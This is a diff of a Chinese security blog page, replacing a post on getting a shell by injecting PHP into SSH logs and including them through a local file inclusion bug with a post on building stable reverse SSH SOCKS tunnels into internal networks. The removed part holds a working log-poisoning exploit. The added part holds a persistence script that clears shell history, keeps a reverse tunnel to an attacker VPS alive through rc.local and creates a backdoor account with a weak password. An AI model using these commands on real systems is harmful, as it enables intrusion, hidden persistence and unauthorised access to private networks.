@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          LFI SSH日志 - Rootclay
+          SSH如何反向代理稳定穿透内网 - Rootclay
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.github.io/2017/03/23/lfi_ssh/">
+    <link rel="canonical" href="http://rootclay.github.io/2017/08/01/SSH如何稳定方向代理/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,16 +88,12 @@
                             
                               <a class="tag" href="/tags/#Web" title="Web">Web</a>
                             
-                              <a class="tag" href="/tags/#LFI" title="LFI">LFI</a>
-                            
-                              <a class="tag" href="/tags/#SSH" title="SSH">SSH</a>
-                            
                         </div>
-                        <h1>LFI SSH日志</h1>
-                        <h2 class="subheading">通过LFI包含到SSH日志来获取SHELL.</h2>
+                        <h1>SSH如何反向代理稳定穿透内网</h1>
+                        <h2 class="subheading">内网代理的个人总结.</h2>
                         <span class="meta">
                             Posted by Rootclay on
-                            2017-03-23
+                            2017-08-01
                         </span>
                     </div>
                 
@@ -214,11 +210,35 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="lfi-ssh日志">LFI SSH日志</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh <span class="string">'&lt;?php system($_GET[‘c’]); ?&gt;'</span>@192.168.32.137</div></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://192.168.32.137/lfi.php?file=/var/<span class="built_in">log</span>/auth.log&amp;c=ls</div></pre></td></tr></table></figure>
-<p>Tips:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/var/<span class="built_in">log</span>/auth.log只有ubuntu系有。</div><div class="line">其实对linux，可以包含/var/<span class="built_in">log</span>/wtmp。一样的效果。有16字符可控，足够了。</div><div class="line">只可以没有x权限。</div></pre></td></tr></table></figure>
+                <blockquote>
+<p>最近在测试一些站点，总是需要进入到对方内网，而使用的代理工具多为不稳定工具，就连ssh也会断掉，这篇文章总结一下自己的稳定代理。</p>
+</blockquote>
+<h2 id="0x00-引言">0x00 引言</h2>
+<p>早期我们可能会采用HTTP Proxy代理，在浏览器上设置下代理服务器的IP、端口、认证账户和密码。但有些软件的网络通信数据并不是HTTP协议，就需要寻找其它方法。</p>
+<p>SOCKS代理是个不错的解决方案，不管应用层是什么协议，只要是传输层是TCP协议就可以代理。SOCKS代理中最新的协议是SOCKS5。相对SOCKS4作了大幅度的增强。</p>
+<p>首先，它增加了对UDP协议的支持；其次，可支持多种用户身份验证方式和通信加密方式；最后，修改了SOCKS服务器进行域名解析的方法，使其更加优雅。</p>
+<h2 id="0x02-socks建立">0x02 Socks建立</h2>
+<p>关于内网的代理工具前人已经总结很多了比如这篇文章<a href="http://bobao.360.cn/learning/detail/3502.html" target="_blank" rel="external">内网漫游之SOCKS代理大结局</a>，那我就不多说这些工具了。</p>
+<h3 id="稳定socks代理ssh">稳定SOCKS代理SSH</h3>
+<p>SSH当之无愧是目前最稳定的代理方式之一，大家用它比较多，但是我们常用的还是他的最简单的转发与正向代理的建立，这里把SSH反向代理分享与大家，不用再为渗透中不稳定的网络而烦恼。</p>
+<h4 id="转发">转发</h4>
+<p>我们常用的是下面的命令，但只能够比较麻烦的访问到端口上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. ssh -CfNg -R 2222:127.0.0.1:22 VPS-user@VPS -p 53   //内网</div><div class="line">2. ssh -CfNg -L 8080:127.0.0.1:2222 VPS-user@VPS       //VPS</div><div class="line">本地访问VPS:8080就是内网的22端口</div></pre></td></tr></table></figure>
+<h4 id="socks正向代理">socks正向代理</h4>
+<p>下面的方式可以用与你与DMZ区的机器通信，但是如果不能直接访问的内网机器便行不通了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ssh -qTfnN -D port remotehost</div><div class="line">在终端中运行 ssh -qTfnN -D 6080 user@theserver</div><div class="line">然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.</div></pre></td></tr></table></figure>
+<h4 id="socks反向代理">socks反向代理</h4>
+<p>那么重点来了，如何建立反向代理呢？其实就是把正向代理和转发结合起来即可：</p>
+<p>第一步，还是先通过内网机器反向连接VPS:<code>ssh -p 22 -qngfNTR 6666:localhost:22 VPS-user@VPS</code>，这样就把本地的22端口转发到了远程机器的6666端口</p>
+<p>第二步，你自己的PC机器直接使用语句:<code>ssh -p 6666 -qngfNTD 6767 内网用户@VPS</code>，这样就可以直接穿透网络，进入到内网，本地机器直接使用代理<code>127.0.0.1:6767</code>便能够直接访问到内网当中</p>
+<p>那么问题来了，用过SSH的代理的朋友应该知道，我们第一步使用的连接方式在VPS监听的6666端口应该是监听在<code>localhost</code>上的，那么在第一步之前就应该修改一些配置了：在VPS的ssh配置当中加入如下配置<code>GatewayPorts yes</code>，这里是指远程转发过来的端口监听在<code>0.0.0.0</code>上。当然也可以你再在VPS本地转发一次即可。</p>
+<p>这样就完了吗？当然没有，经过测试，我们是无法让这个代理保持一直在线的，SSH在一定时间没有任何的操作后就会自动的断开，那么我们同样再次修改配置文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">找到 ClientAliveInterval 0和ClientAliveCountMax 3并将注释符号（&quot;#&quot;）去掉,</div><div class="line">将ClientAliveInterval对应的0改成60,ClientAliveInterval指定了服务器端向客户端请求消息的时间间隔, 默认是0,不发送.</div><div class="line">ClientAliveInterval 60表示每分钟发送一次, 然后客户端响应, 这样就保持长连接了.</div><div class="line">ClientAliveCountMax, 使用默认值3即可.ClientAliveCountMax表示服务器发出请求后客户端没有响应的次数达到一定值, 就自动断开.</div></pre></td></tr></table></figure>
+<p>这样的配置就能让一个SSH的配置保持长连接了，代理就能稳定的在线。那么这样是需要每次都输入密码而且每次输入一大堆命令很麻烦，这里写了一个简单的CentOS上使用脚本来开启代理。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/env bash </span></div><div class="line"><span class="built_in">export</span> HISTSIZE=0</div><div class="line"><span class="comment"># install</span></div><div class="line"><span class="built_in">cd</span> /etc/yum.repos.d/</div><div class="line">wget http://download.opensuse.org/repositories/home:Strahlex/CentOS_CentOS-6/home:Strahlex.repo</div><div class="line">yum install -y sshpass</div><div class="line">yum install -y screen</div><div class="line"></div><div class="line"></div><div class="line">mkdir /tmp/mongo &amp;&amp; chown $(whoami):$(whoami) /tmp/mongo</div><div class="line">sudo tee /tmp/mongo/daemon.sh &lt;&lt;-<span class="string">'EOF'</span></div><div class="line"><span class="meta">#!/usr/bin/env bash</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> :</div><div class="line"><span class="keyword">do</span></div><div class="line">    /usr/bin/sshpass -p 你的VPS密码 ssh -p 22 -qngfNTR 6770:localhost:22 VPS-user@VPS -o StrictHostKeyChecking=no</div><div class="line">    sleep 18000</div><div class="line">    ps -ef | grep qngfNTR | awk <span class="string">'&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9 </div><div class="line"><span class="keyword">done</span></div><div class="line">EOF</div><div class="line"></div><div class="line">chmod +x /tmp/mongo/daemon.sh</div><div class="line"><span class="built_in">echo</span> <span class="string">"screen -dmS test /tmp/mongo/daemon.sh"</span> &gt;&gt; /etc/rc.d/rc.local</div><div class="line">screen -dmS socks /tmp/mongo/daemon.sh</div><div class="line">useradd <span class="built_in">test</span>;<span class="built_in">echo</span> <span class="string">'test:1234'</span> | chpasswd</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/usr/<span class="built_in">local</span>/bin/sshpass -p <span class="string">"1234"</span> ssh -p 6770 -qngfNTD 6770 <span class="built_in">test</span>@VPS -o StrictHostKeyChecking=no</div><div class="line">本地执行执行这条命令即可，代理设置为127.0.0.1:6770即可进入内网</div></pre></td></tr></table></figure>
+<p>这样建立起来的socks网络是非常的稳定的，搭建了之后可以试一试开扫描器扫一扫，高线程都不会掉。。。而前面使用的比如EW之类的。。。一扫就挂，5线程都会挂。这个开100线程都没问题哦。</p>
+
                 
 
                 <hr>
@@ -226,12 +246,12 @@
                 <ul class="pager">
                     
                         <li class="previous">
-                            <a href="/2017/03/23/mysql日志包含拿shell/" data-toggle="tooltip" data-placement="top" title="SQL语句利用日志写shell">&larr; Previous Post</a>
+                            <a href="/2017/08/02/日志清理/" data-toggle="tooltip" data-placement="top" title="日志清理">&larr; Previous Post</a>
                         </li>
                     
                     
                         <li class="next">
-                            <a href="/2017/03/20/docker三剑客/" data-toggle="tooltip" data-placement="top" title="Docker 三侠客">Next Post &rarr;</a>
+                            <a href="/2017/07/25/内网代理/" data-toggle="tooltip" data-placement="top" title="内网代理">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -261,7 +281,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#lfi-ssh日志"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">LFI SSH日志</span></a></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x00-引言"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">0x00 引言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-socks建立"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">0x02 Socks建立</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#稳定socks代理ssh"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">稳定SOCKS代理SSH</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#转发"><span class="toc-nav-number">2.1.1.</span> <span class="toc-nav-text">转发</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#socks正向代理"><span class="toc-nav-number">2.1.2.</span> <span class="toc-nav-text">socks正向代理</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#socks反向代理"><span class="toc-nav-number">2.1.3.</span> <span class="toc-nav-text">socks反向代理</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
@@ -282,10 +302,6 @@
                     <div class="tags">
                        
                           <a class="tag" href="/tags/#Web" title="Web">Web</a>
-                        
-                          <a class="tag" href="/tags/#LFI" title="LFI">LFI</a>
-                        
-                          <a class="tag" href="/tags/#SSH" title="SSH">SSH</a>
                         
                     </div>
                 </section>
@@ -332,8 +348,8 @@
 <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "your-disqus-ID";
-    var disqus_identifier = "http://rootclay.github.io/2017/03/23/lfi_ssh/";
-    var disqus_url = "http://rootclay.github.io/2017/03/23/lfi_ssh/";
+    var disqus_identifier = "http://rootclay.github.io/2017/08/01/SSH如何稳定方向代理/";
+    var disqus_url = "http://rootclay.github.io/2017/08/01/SSH如何稳定方向代理/";
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
